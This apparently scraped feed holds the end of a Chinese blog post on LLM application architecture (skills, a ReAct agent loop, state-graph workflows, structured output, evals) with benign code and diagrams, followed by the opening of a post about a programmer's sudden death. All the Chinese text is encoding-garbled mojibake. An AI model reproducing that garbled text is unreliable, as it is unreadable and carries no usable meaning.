    files?: <span class="hljs-built_in">string</span>[];     <span class="hljs-comment">// é™æ€æ–‡æ¡£è·¯å¾„</span>
    dynamic?: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;; <span class="hljs-comment">// è¿è¡Œæ—¶è·å–çš„çŠ¶æ€ (e.g. å½“å‰ç”¨æˆ·IDã€ç³»ç»Ÿæ—¶é—´)</span>
  };

  <span class="hljs-comment">// å·¥å…·é›†ï¼šè¯¥æŠ€èƒ½å¯ç”¨çš„åŸå­èƒ½åŠ›</span>
  <span class="hljs-attr">tools</span>: <span class="hljs-title class_">ToolDefinition</span>[]; 
}

<span class="hljs-comment">// ç¤ºä¾‹ï¼šå®šä¹‰ä¸€ä¸ª SQL æŸ¥è¯¢æŠ€èƒ½</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">sqlExpertSkill</span>: <span class="hljs-title class_">Skill</span> = {
  <span class="hljs-attr">metadata</span>: {
    <span class="hljs-attr">id</span>: <span class="hljs-string">'sql-expert-v1'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'SQL Generator &amp; Executor'</span>,
    <span class="hljs-attr">description</span>: <span class="hljs-string">'When users need to query database or analyze data via SQL'</span>,
  },
  <span class="hljs-attr">instruction</span>: <span class="hljs-string">`
    You are a PostgreSQL expert. 
    1. Always explain the query plan before execution.
    2. Read-only queries allowed.
    3. Use ISO 8601 for dates.
  `</span>,
  <span class="hljs-attr">context</span>: {
    <span class="hljs-attr">files</span>: [<span class="hljs-string">'./docs/db_schema.md'</span>], <span class="hljs-comment">// æ³¨å…¥è¡¨ç»“æ„</span>
  },
  <span class="hljs-attr">tools</span>: [runQueryTool, listTablesTool] <span class="hljs-comment">// æŒ‚è½½ MCP å·¥å…·æˆ–æœ¬åœ°å‡½æ•°</span>
};

</code></pre>
<h3 data-id="heading-2">Skill çš„åŠ è½½ä¸æ‰§è¡Œæµç¨‹</h3>
<p>Skill çš„æ ¸å¿ƒä»·å€¼åœ¨äº<strong>æŒ‰éœ€åŠ è½½</strong>ã€‚æˆ‘ä»¬ä¸éœ€è¦å°†æ‰€æœ‰ Prompt å’Œ Tool ä¸€æ¬¡æ€§å¡å…¥ Context Windowï¼Œè€Œæ˜¯é€šè¿‡è·¯ç”±åŠ¨æ€æ¿€æ´»ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[ç”¨æˆ·è¾“å…¥ User Input] --&gt; B{Router æ„å›¾è¯†åˆ«}
    
    subgraph "Skill Registry"
        C[Coding Skill]
        D[Data Analysis Skill]
        E[General Chat Skill]
    end
    
    B --&gt;|Match: SQL| D
    B --&gt;|Match: Bug fix| C
    
    D --&gt; F[Context Assembler]
    
    subgraph "Runtime Context"
        G[System Prompt + Skill Instruction]
        H[Global Context + Skill Files]
        I[Registered Tools]
    end
    
    F --&gt; G
    F --&gt; H
    D --&gt; I
    
    I --&gt; J[LLM Inference]

</code></pre>
<h2 data-id="heading-3">Agentï¼šä»æ— çŠ¶æ€æ¨ç†åˆ°æœ‰çŠ¶æ€å¾ªç¯</h2>
<p>LLM æœ¬èº«æ˜¯æ— çŠ¶æ€çš„ï¼ˆStatelessï¼‰ï¼Œè¾“å…¥ä»€ä¹ˆè¾“å‡ºä»€ä¹ˆã€‚Agent åˆ™æ˜¯é€šè¿‡**å¾ªç¯ï¼ˆLoopï¼‰<strong>å’Œ</strong>è®°å¿†ï¼ˆMemoryï¼‰**æœºåˆ¶ï¼Œè®© LLM å…·å¤‡äº†è¿ç»­æ‰§è¡Œä»»åŠ¡çš„èƒ½åŠ›ã€‚</p>
<p>ç›®å‰ä¸»æµçš„ Agent æ¶æ„é€šå¸¸åŸºäº <strong>ReAct (Reasoning + Acting)</strong> æ¨¡å¼ã€‚</p>
<h3 data-id="heading-4">ReAct å¾ªç¯</h3>
<p>Agent çš„æ ¸å¿ƒæ˜¯ä¸€ä¸ª <code>while</code> å¾ªç¯ï¼Œç›´åˆ° LLM åˆ¤å®šä»»åŠ¡ç»“æŸæˆ–è¾¾åˆ°æœ€å¤§è¿­ä»£æ¬¡æ•°ã€‚ä¼ªä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">runAgentLoop</span>(<span class="hljs-params">userQuery, tools</span>) {
  <span class="hljs-keyword">let</span> messages = [
    { <span class="hljs-attr">role</span>: <span class="hljs-string">'system'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'You are a helpful assistant...'</span> },
    { <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: userQuery }
  ];

  <span class="hljs-keyword">let</span> iterations = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAX_ITERATIONS</span> = <span class="hljs-number">10</span>;

  <span class="hljs-keyword">while</span> (iterations &lt; <span class="hljs-variable constant_">MAX_ITERATIONS</span>) {
    <span class="hljs-comment">// 1. è°ƒç”¨ LLM</span>
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> llm.<span class="hljs-title function_">chat</span>({ messages, tools });
    <span class="hljs-keyword">const</span> message = response.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>;

    <span class="hljs-comment">// 2. å°† LLM çš„å›å¤åŠ å…¥å†å²</span>
    messages.<span class="hljs-title function_">push</span>(message);

    <span class="hljs-comment">// 3. åˆ¤æ–­æ˜¯å¦éœ€è¦åœæ­¢ï¼ˆæ— å·¥å…·è°ƒç”¨åˆ™è§†ä¸ºå›ç­”å®Œæ¯•ï¼‰</span>
    <span class="hljs-keyword">if</span> (!message.<span class="hljs-property">tool_calls</span> || message.<span class="hljs-property">tool_calls</span>.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">return</span> message.<span class="hljs-property">content</span>;
    }

    <span class="hljs-comment">// 4. æ‰§è¡Œå·¥å…·è°ƒç”¨ (Action)</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> toolCall <span class="hljs-keyword">of</span> message.<span class="hljs-property">tool_calls</span>) {
      <span class="hljs-keyword">const</span> toolName = toolCall.<span class="hljs-property">function</span>.<span class="hljs-property">name</span>;
      <span class="hljs-keyword">const</span> args = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(toolCall.<span class="hljs-property">function</span>.<span class="hljs-property">arguments</span>);
      
      <span class="hljs-comment">// æ‰§è¡Œå…·ä½“å‡½æ•°</span>
      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">executeTool</span>(toolName, args);
      
      <span class="hljs-comment">// 5. å°†å·¥å…·ç»“æœå›å¡«ç»™ LLM (Observation)</span>
      <span class="hljs-comment">// æ³¨æ„ï¼šè¿™ä¸€æ­¥æ˜¯ä¸ºäº†è®© LLM åœ¨ä¸‹ä¸€æ¬¡å¾ªç¯ä¸­çœ‹åˆ°å·¥å…·æ‰§è¡Œçš„ç»“æœï¼Œä»è€Œç”Ÿæˆæœ€ç»ˆå›ç­”</span>
      messages.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">role</span>: <span class="hljs-string">'tool'</span>,
        <span class="hljs-attr">tool_call_id</span>: toolCall.<span class="hljs-property">id</span>,
        <span class="hljs-attr">content</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(result)
      });
    }

    iterations++;
  }
}

</code></pre>
<h3 data-id="heading-5">Agent çŠ¶æ€æµè½¬å›¾</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant Client
    participant AgentCore
    participant LLM
    participant ToolEnv as å·¥å…·ç¯å¢ƒ(API/DB)

    Client-&gt;&gt;AgentCore: ä»»åŠ¡æŒ‡ä»¤
    loop ReAct Loop
        AgentCore-&gt;&gt;LLM: å½“å‰æ¶ˆæ¯å†å² (History)
        LLM--&gt;&gt;AgentCore: è¿”å›æ€è€ƒ (Thought) + å·¥å…·è°ƒç”¨ (Call)
        
        opt æ— å·¥å…·è°ƒç”¨
            AgentCore--&gt;&gt;Client: è¿”å›æœ€ç»ˆç»“æœ
            Note right of AgentCore: å¾ªç¯ç»“æŸ
        end
        
        AgentCore-&gt;&gt;ToolEnv: æ‰§è¡Œå·¥å…· (Action)
        ToolEnv--&gt;&gt;AgentCore: è¿”å›æ‰§è¡Œç»“æœ (Observation)
        AgentCore-&gt;&gt;AgentCore: æ›´æ–°æ¶ˆæ¯å†å² (Append History)
    end

</code></pre>
<h2 data-id="heading-6">Workflowï¼šç¡®å®šæ€§çš„ç¼–æ’</h2>
<p>å½“å•ä¸€ Agent æ— æ³•èƒœä»»å¤æ‚åœºæ™¯ï¼ˆå¦‚å…ˆå†™éœ€æ±‚æ–‡æ¡£ï¼Œå†å†™ä»£ç ï¼Œæœ€åè¿è¡Œæµ‹è¯•ï¼‰æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å¼•å…¥ <strong>Workflowï¼ˆå·¥ä½œæµï¼‰</strong>ã€‚</p>
<p>Agent å€¾å‘äºè‡ªä¸»å†³ç­–ï¼ˆProbabilisticï¼‰ï¼Œè€Œ Workflow å¼ºè°ƒç¡®å®šæ€§çš„æµç¨‹æ§åˆ¶ï¼ˆDeterministicï¼‰ã€‚åœ¨å®é™…å·¥ç¨‹ä¸­ï¼Œé€šå¸¸é‡‡ç”¨ <strong>DAGï¼ˆæœ‰å‘æ— ç¯å›¾ï¼‰</strong> æˆ– <strong>State Graphï¼ˆçŠ¶æ€å›¾ï¼‰</strong> æ¥ç¼–æ’å¤šä¸ª Agentã€‚</p>
<h3 data-id="heading-7">å¸¸è§çš„ Workflow æ¨¡å¼</h3>
<h4 data-id="heading-8">1. Planning Pattern (è§„åˆ’-æ‰§è¡Œæ¨¡å¼)</h4>
<p>å°†ä»»åŠ¡æ‹†è§£ä¸º Planï¼Œç„¶åé€ä¸€ Executeã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    Start[ç”¨æˆ·éœ€æ±‚] --&gt; Planner[Planner Agent]
    Planner --&gt;|ç”Ÿæˆ Plan List| Controller
    
    subgraph Execution Loop
        Controller --&gt;|å–ä¸‹ä¸€ä¸ª Task| Worker[Worker Agent]
        Worker --&gt;|æ‰§è¡Œç»“æœ| Reflector[Reflector Agent]
        Reflector --&gt;|ç»“æœæ£€æŸ¥| Check{æ˜¯å¦é€šè¿‡?}
        
        Check --&gt;|æ˜¯| Controller
        Check --&gt;|å¦/é‡è¯•| Worker
    end
    
    Controller --&gt;|åˆ—è¡¨ä¸ºç©º| Summarizer[æ€»ç»“è¾“å‡º]
    Summarizer --&gt; End

</code></pre>
<h4 data-id="heading-9">2. Multi-Agent Handoff (å¤šæ™ºèƒ½ä½“åä½œ)</h4>
<p>ç±»ä¼¼å·¥å‚æµæ°´çº¿ï¼Œä¸Šæ¸¸ Agent çš„è¾“å‡ºä½œä¸ºä¸‹æ¸¸ Agent çš„è¾“å…¥ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    User --&gt; A[Product Manager Agent]
    A --&gt;|PRDæ–‡æ¡£| B[Developer Agent]
    B --&gt;|æºä»£ç | C[Code Reviewer Agent]
    
    C --&gt;|Reviewæ„è§| D{é€šè¿‡?}
    D --&gt;|å¦| B
    D --&gt;|æ˜¯| E[Deployer Agent]

</code></pre>
<h3 data-id="heading-10">ä¼ªä»£ç ï¼šåŸºäºçŠ¶æ€å›¾çš„ç¼–æ’</h3>
<p>ä½¿ç”¨ç±»ä¼¼ LangGraph çš„é€»è¾‘æ¥å®šä¹‰å·¥ä½œæµï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å®šä¹‰çŠ¶æ€</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">State</span> = {
  <span class="hljs-attr">input</span>: <span class="hljs-title class_">String</span>,
  <span class="hljs-attr">code</span>: <span class="hljs-title class_">String</span>,
  <span class="hljs-attr">review_comments</span>: <span class="hljs-title class_">String</span>,
  <span class="hljs-attr">status</span>: <span class="hljs-string">'planning'</span> | <span class="hljs-string">'coding'</span> | <span class="hljs-string">'reviewing'</span> | <span class="hljs-string">'finished'</span>
};

<span class="hljs-comment">// å®šä¹‰èŠ‚ç‚¹ï¼ˆNodeï¼‰</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">codingNode</span>(<span class="hljs-params">state</span>) {
  <span class="hljs-keyword">const</span> code = <span class="hljs-keyword">await</span> codingAgent.<span class="hljs-title function_">generate</span>(state.<span class="hljs-property">input</span>);
  <span class="hljs-keyword">return</span> { ...state, code, <span class="hljs-attr">status</span>: <span class="hljs-string">'reviewing'</span> };
}

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">reviewNode</span>(<span class="hljs-params">state</span>) {
  <span class="hljs-keyword">const</span> comments = <span class="hljs-keyword">await</span> reviewAgent.<span class="hljs-title function_">check</span>(state.<span class="hljs-property">code</span>);
  <span class="hljs-keyword">if</span> (comments.<span class="hljs-property">hasCriticalIssues</span>) {
    <span class="hljs-keyword">return</span> { ...state, <span class="hljs-attr">review_comments</span>: comments, <span class="hljs-attr">status</span>: <span class="hljs-string">'coding'</span> }; <span class="hljs-comment">// å›é€€</span>
  }
  <span class="hljs-keyword">return</span> { ...state, <span class="hljs-attr">status</span>: <span class="hljs-string">'finished'</span> };
}

<span class="hljs-comment">// å®šä¹‰å›¾ï¼ˆGraphï¼‰</span>
<span class="hljs-keyword">const</span> graph = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StateGraph</span>();
graph.<span class="hljs-title function_">addNode</span>(<span class="hljs-string">'coder'</span>, codingNode);
graph.<span class="hljs-title function_">addNode</span>(<span class="hljs-string">'reviewer'</span>, reviewNode);

<span class="hljs-comment">// å®šä¹‰è¾¹ï¼ˆEdgeï¼‰</span>
graph.<span class="hljs-title function_">addEdge</span>(<span class="hljs-string">'coder'</span>, <span class="hljs-string">'reviewer'</span>);
graph.<span class="hljs-title function_">addConditionalEdge</span>(<span class="hljs-string">'reviewer'</span>, <span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> state.<span class="hljs-property">status</span> === <span class="hljs-string">'coding'</span> ? <span class="hljs-string">'coder'</span> : <span class="hljs-string">'end'</span>;
});

<span class="hljs-comment">// æ‰§è¡Œ</span>
<span class="hljs-keyword">await</span> graph.<span class="hljs-title function_">compile</span>().<span class="hljs-title function_">invoke</span>({ <span class="hljs-attr">input</span>: <span class="hljs-string">"Implement a login page"</span> });

</code></pre>
<h2 data-id="heading-11">å·¥ç¨‹åŒ–æŒ‘æˆ˜ï¼šç»“æ„åŒ–è¾“å‡ºä¸è¯„ä¼°</h2>
<p>åœ¨ä¼ä¸šçº§è½åœ°ä¸­ï¼Œä»…æœ‰æ¶æ„æ˜¯ä¸å¤Ÿçš„ï¼Œå¿…é¡»è§£å†³ç¨³å®šæ€§å’Œå¯è§‚æµ‹æ€§é—®é¢˜ã€‚</p>
<h3 data-id="heading-12">ç»“æ„åŒ–è¾“å‡º (Structured Output)</h3>
<p>LLM é»˜è®¤è¾“å‡ºéç»“æ„åŒ–æ–‡æœ¬ã€‚ä¸ºäº†è®© Workflow ä¸­çš„èŠ‚ç‚¹èƒ½å¤Ÿé€šä¿¡ï¼Œå¿…é¡»å¼ºåˆ¶ LLM è¾“å‡ºä¸¥æ ¼çš„ JSONã€‚</p>
<p><strong>å®ç°æ–¹æ¡ˆï¼š</strong></p>
<ol>
<li><strong>Instruction Tuning</strong>ï¼šåœ¨ Prompt ä¸­ç»™å‡º JSON ç¤ºä¾‹ï¼ˆç¨³å®šæ€§ä¸€èˆ¬ï¼‰ã€‚</li>
<li><strong>Function Calling Mode</strong>ï¼šåˆ©ç”¨ Tool Call å‚æ•°å¿…é¡»ä¸º JSON çš„ç‰¹æ€§ï¼ˆç¨³å®šæ€§é«˜ï¼‰ã€‚</li>
<li><strong>Grammar Sampling</strong>ï¼šåœ¨æ¨ç†å¼•æ“å±‚ï¼ˆå¦‚ llama.cppï¼‰ä½¿ç”¨ BNF è¯­æ³•çº¦æŸ Token é‡‡æ ·ï¼ˆç¨³å®šæ€§æœ€é«˜ï¼‰ã€‚</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// åˆ©ç”¨ Zod å®šä¹‰è¾“å‡º Schema</span>
<span class="hljs-keyword">import</span> { z } <span class="hljs-keyword">from</span> <span class="hljs-string">'zod'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title class_">AnalysisSchema</span> = z.<span class="hljs-title function_">object</span>({
  <span class="hljs-attr">sentiment</span>: z.<span class="hljs-title function_">enum</span>([<span class="hljs-string">'positive'</span>, <span class="hljs-string">'neutral'</span>, <span class="hljs-string">'negative'</span>]),
  <span class="hljs-attr">key_points</span>: z.<span class="hljs-title function_">array</span>(z.<span class="hljs-title function_">string</span>()),
  <span class="hljs-attr">confidence_score</span>: z.<span class="hljs-title function_">number</span>().<span class="hljs-title function_">min</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">max</span>(<span class="hljs-number">1</span>)
});

<span class="hljs-comment">// å¤§éƒ¨åˆ†ç°ä»£ SDK æ”¯æŒç›´æ¥ä¼ é€’ Schema</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> llm.<span class="hljs-title function_">generateObject</span>({
  <span class="hljs-attr">model</span>: <span class="hljs-string">'gpt-4'</span>,
  <span class="hljs-attr">schema</span>: <span class="hljs-title class_">AnalysisSchema</span>,
  <span class="hljs-attr">prompt</span>: <span class="hljs-string">'åˆ†æè¿™æ®µå®¢æˆ·åé¦ˆ...'</span>
});

</code></pre>
<h3 data-id="heading-13">è‡ªåŠ¨åŒ–è¯„ä¼° (Evals)</h3>
<p>Agent ç³»ç»Ÿæ˜¯ä¸€ä¸ªé»‘ç›’ï¼Œå¿…é¡»å»ºç«‹è¯„ä¼°æµæ°´çº¿ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    DS["æµ‹è¯•æ•°æ®é›† (Dataset)"] --&gt; Agent["Agent System"]
    Agent --&gt; Output["å®é™…è¾“å‡º"]
    
    DS --&gt; GT["æ ‡å‡†ç­”æ¡ˆ (Ground Truth)"]
    
    Output --&gt; Judge["Judge LLM (GPT-4)"]
    GT --&gt; Judge
    
    Judge --&gt; Metric1["å‡†ç¡®æ€§"]
    Judge --&gt; Metric2["å¹»è§‰æ£€æµ‹"]
    Judge --&gt; Metric3["å·¥å…·ä½¿ç”¨æ­£ç¡®ç‡"]

</code></pre>
<h2 data-id="heading-14">ç»“è¯­</h2>
<p>ä» Transformer çš„åº•å±‚åŸç†ï¼Œåˆ° Skillã€Agentã€Workflow çš„ä¸Šå±‚æ¶æ„ï¼Œæˆ‘ä»¬å·²ç»å®Œæ•´æ¢³ç†äº†æ„å»ºç°ä»£ AI åº”ç”¨çš„æŠ€æœ¯æ ˆã€‚</p>
<ul>
<li><strong>Skill</strong> è§£å†³äº†â€œèƒ½åŠ›å¤ç”¨â€ä¸â€œä¸Šä¸‹æ–‡éš”ç¦»â€çš„é—®é¢˜ã€‚</li>
<li><strong>Agent</strong> è§£å†³äº†â€œå¤æ‚ä»»åŠ¡è‡ªåŠ¨æ¨æ¼”â€çš„é—®é¢˜ã€‚</li>
<li><strong>Workflow</strong> è§£å†³äº†â€œå¤šæ­¥éª¤åä½œâ€ä¸â€œè¿‡ç¨‹å¯æ§æ€§â€çš„é—®é¢˜ã€‚</li>
</ul>
<p>æœªæ¥çš„ç«äº‰ç„¦ç‚¹å°†ä¸å†å±€é™äºæ¨¡å‹æœ¬èº«çš„å‚æ•°é‡ï¼Œè€Œåœ¨äºè°èƒ½æ„å»ºå‡ºæ›´é«˜æ•ˆçš„ Agent Runtime å’Œæ›´ä¸°å¯Œçš„ Skill ç”Ÿæ€ã€‚å¸Œæœ›è¿™ä¸¤ç¯‡æ–‡ç« èƒ½ä¸ºä½ æ„å»ºè‡ªå·±çš„ AI åº”ç”¨æä¾›æ‰å®çš„å·¥ç¨‹å‚è€ƒã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆ«ç”¨å‘½æ¢å·¥ä½œï¼šä¸€ä½32å²ç¨‹åºå‘˜å‘¨æœ«æ™•å€’åçŒæ­»ç•™ç»™æˆ‘ä»¬çš„ç”Ÿå­˜æ€è€ƒ]]></title>    <link>https://juejin.cn/post/7597758250825793546</link>    <guid>https://juejin.cn/post/7597758250825793546</guid>    <pubDate>2026-01-22T04:23:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597758250825793546" data-draft-id="7597704040215969818" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆ«ç”¨å‘½æ¢å·¥ä½œï¼šä¸€ä½32å²ç¨‹åºå‘˜å‘¨æœ«æ™•å€’åçŒæ­»ç•™ç»™æˆ‘ä»¬çš„ç”Ÿå­˜æ€è€ƒ"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-22T04:23:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¿®å·±xj"/> <meta itemprop="url" content="https://juejin.cn/user/2641475936724142"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆ«ç”¨å‘½æ¢å·¥ä½œï¼šä¸€ä½32å²ç¨‹åºå‘˜å‘¨æœ«æ™•å€’åçŒæ­»ç•™ç»™æˆ‘ä»¬çš„ç”Ÿå­˜æ€è€ƒ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2641475936724142/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¿®å·±xj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T04:23:25.000Z" title="Thu Jan 22 2026 04:23:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä»Šå¤©ï¼Œä¸€åˆ™å…³äºåŒè¡Œçš„æ–°é—»è®©æˆ‘åœ¨å±å¹•å‰æ²‰é»˜è®¸ä¹…â€”â€”ã€Š32å²ç¨‹åºå‘˜å‘¨æœ«æ™•å€’åçŒæ­»ã€‹ã€‚</p>
<p>é«˜å¹¿è¾‰ï¼Œå’Œæˆ‘ä¸€æ ·æ˜¯32å²çš„ç¨‹åºå‘˜ã€‚ä»–çš„éª¤ç„¶ç¦»å»ï¼Œå¹¶éç³»ç»Ÿå¼‚å¸¸ï¼Œä¹Ÿéå¶å‘<code>bug</code>ï¼Œè€Œæ˜¯æˆ‘ä»¬è¿™ä¸€ä»£äººåœ¨<code>ç‰›é©¬</code>èˆ¬é«˜å‹å·¥ä½œçŠ¶æ€ä¸‹ï¼Œä¸€ä»¶ä»¤äººå¿ƒç¢å´åˆå±¡è§ä¸é²œçš„å¯»å¸¸ä¹‹äº‹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3ec620df1c346eea906937065aa8373~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769660604&amp;x-signature=vh85msMJ4TPU6PCaAhejJPcp2yQ%3D" alt="" loading="lazy"/></p>
